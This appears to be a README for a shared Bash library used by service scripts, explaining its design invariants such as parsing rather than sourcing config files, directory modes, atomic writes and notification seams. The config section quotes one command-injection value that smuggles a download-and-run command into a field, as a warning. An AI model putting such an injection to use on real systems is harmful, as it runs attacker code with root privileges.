# The shared shell library

`lib/` is the only code shared between services. Every service script reaches it through its
own `lib.sh`, which pins `BOMA_LIB_DIR` first and then sources `lib/boma.sh` — the single
entry point that pulls in logging, filesystem helpers, version arithmetic, the notify seam
and the platform assertions.

Each file is idempotent under repeated sourcing (`[[ -n "${_BOMA_X_SH:-}" ]] && return 0`),
because a service script may source several of them by different paths.

## The seams, and the invariants behind them

These are not style preferences. Each one exists because the obvious alternative failed in a
specific way, and the comment above it in the source says how.

**`boma_strict` is a function, not applied on source.** Entry-point scripts call it to get
`set -euo pipefail`. Applying it at source time would impose `errexit` on `bats`, which
interacts badly with test frameworks — the library has to be sourceable for a single helper
without changing the caller's shell options.

**`load_config` parses; it never sources.** These files are read as root by systemd timers.
Sourcing executes whatever they contain, and a blacklist cannot save you:
`URL=https://h/p;curl x|sh` has no `$(`, backtick or `${` in it and still runs as root.
Parsing removes the execution step, so no blacklist has to be complete. One layer of matching
quotes is stripped; nothing is expanded, ever. Do not "improve" this into a `source`.

**`BOMA_CONFIG_KEYS` accumulates across calls and is never reset.** `install.sh` loads
`boma.env` and then `restic.env`; resetting on the second call made `boma_config_was_set`
forget everything the first had set, silently reverting operator-configured paths to
defaults. Use `boma_config_was_set` before re-deriving any value a config file might own.

**`ensure_dir` enforces a mode on every call; `ensure_dir_if_missing` does not.** The second
exists because applying a default `0755` to a directory a caller had deliberately created
`0700` silently widened it. Pick deliberately: enforcing is right for a directory boma owns,
and wrong for one whose mode someone else chose.

**`atomic_write` writes to a temp file in the same directory and `mv -f`s it into place.** Its
cleanup is explicit rather than a `RETURN` trap — a `RETURN` trap would clobber the caller's
trap *and* miss the `die()` paths, cleaning up in exactly the cases that did not need it. It
creates a missing parent at `0750` and never re-applies a mode to an existing one, because
writing a file must not relax the permissions of the directory holding it.

**`generate_passphrase` excludes `0 O 1 l I` and emits hyphenated groups.** A transcription
error in a recovery passphrase stays invisible until the moment it is needed, so ambiguous
glyphs are removed rather than warned about. Default is 8 groups of 5 ≈ 200 bits. Use
`generate_token` for anything only a machine reads. Both disable `pipefail` in a subshell,
because `head -c` closes the pipe and kills `tr` with SIGPIPE; the result is validated by
length instead.

**`have_tty` actually opens `/dev/tty`.** `[[ -r /dev/tty ]]` is not sufficient — inside a
container the node exists and tests readable, but opening it fails with `ENXIO`. Getting this
wrong means a confirmation prompt is silently skipped.

**`require_file_mode` fails closed.** A secret file with an unexpected mode is an error, not
a warning.

## The notify seam

Every script reaches the operator through `notify()` and never talks to a provider directly,
so swapping backends is a config change. Backends in precedence order: `BOMA_NOTIFY_CMD`
(invoked as `<cmd> <severity> <subject> <body>`), then `BOMA_NOTIFY_URL` (JSON POST), then
log-only. wardnet's admin app is the intended default.

**`notify()` never fails the calling script.** A backup that succeeded but could not be
announced has still succeeded, and a failure handler that dies while reporting a failure
loses the original error. Preserve that contract in anything you add here.

`heartbeat()` is the separate "I am alive" signal. It is not a failure alert and cannot be
folded into one: only a heartbeat reveals a host that is dead or a timer that never fired,
because a failure alert needs something still running in order to send it.

## Platform assertions

`preflight_host()` is what every service script calls: `require_root`, `require_arch`,
`require_debian`, `require_systemd`. It fails closed — an unrecognised platform is an error,
never a warning — because these scripts create system users, write to `/etc` and manage a
password vault. See `PLATFORM.md`.

`BOMA_SKIP_PREFLIGHT=1` bypasses it and logs a warning loudly when it does, so it cannot be
left on by accident. It exists for the test harness, which runs the same scripts in a Debian
container that is deliberately not a Raspberry Pi. Never set it on a real host.

## Style

Lint is `shellcheck -x -S style` over `lib/*.sh services/*/*.sh`, and must be clean. `-x`
follows `source` directives, which is why each one carries a `# shellcheck source=<path>`
comment relative to the repo root. A `# shellcheck disable=` needs the reason on the same
line.
